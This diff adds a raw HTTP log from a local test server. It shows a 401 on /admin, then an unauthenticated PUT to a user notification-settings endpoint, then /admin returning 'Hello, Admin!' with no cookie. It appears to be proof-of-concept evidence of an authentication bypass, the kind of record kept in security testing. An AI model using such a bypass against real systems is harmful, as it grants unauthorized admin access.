@@ -1,0 +1,99 @@
+=== CONTROL: GET /admin with no cookie ===
+HTTP/1.1 401 Unauthorized
+Access-Control-Allow-Origin: http://127.0.0.1:8094
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+X-RateLimit-Limit: 1000
+X-RateLimit-Remaining: 998
+Date: Sun, 11 Oct 2026 10:06:25 GMT
+X-RateLimit-Reset: 1791713808
+RateLimit-Policy: 1000;w=900
+RateLimit-Limit: 1000
+RateLimit-Remaining: 998
+RateLimit-Reset: 622
+X-Request-Id: 3580dc9d-071c-463c-90d0-68a7eae12eec
+Content-Type: text/html; charset=utf-8
+Content-Length: 12
+ETag: W/"c-dAuDFQrdjS3hezqxDTNgW7AOlYk"
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Unauthorized
+=== EXPLOIT: PUT /users/1/settings/notifications ===
+HTTP/1.1 201 Created
+Access-Control-Allow-Origin: http://127.0.0.1:8094
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+X-RateLimit-Limit: 1000
+X-RateLimit-Remaining: 997
+Date: Sun, 11 Oct 2026 10:06:25 GMT
+X-RateLimit-Reset: 1791713808
+RateLimit-Policy: 1000;w=900
+RateLimit-Limit: 1000
+RateLimit-Remaining: 997
+RateLimit-Reset: 622
+X-Request-Id: 6f859c88-7104-4b8e-8b88-462ca96e6c9a
+Content-Type: text/html; charset=utf-8
+Content-Length: 46
+ETag: W/"2e-OqdKlo4QDNwEVcaKdXdvmUPsgis"
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+User notification setting updated successfully
+=== AFTER: GET /admin with no cookie ===
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://127.0.0.1:8094
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+X-RateLimit-Limit: 1000
+X-RateLimit-Remaining: 996
+Date: Sun, 11 Oct 2026 10:06:25 GMT
+X-RateLimit-Reset: 1791713808
+RateLimit-Policy: 1000;w=900
+RateLimit-Limit: 1000
+RateLimit-Remaining: 996
+RateLimit-Reset: 622
+X-Request-Id: e2e4ffcc-96b1-4bbe-9036-1cec05518cca
+Content-Type: text/html; charset=utf-8
+Content-Length: 13
+ETag: W/"d-dTC2NRNDuq3Qy5oyqrYLhzX6n9c"
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Hello, Admin!
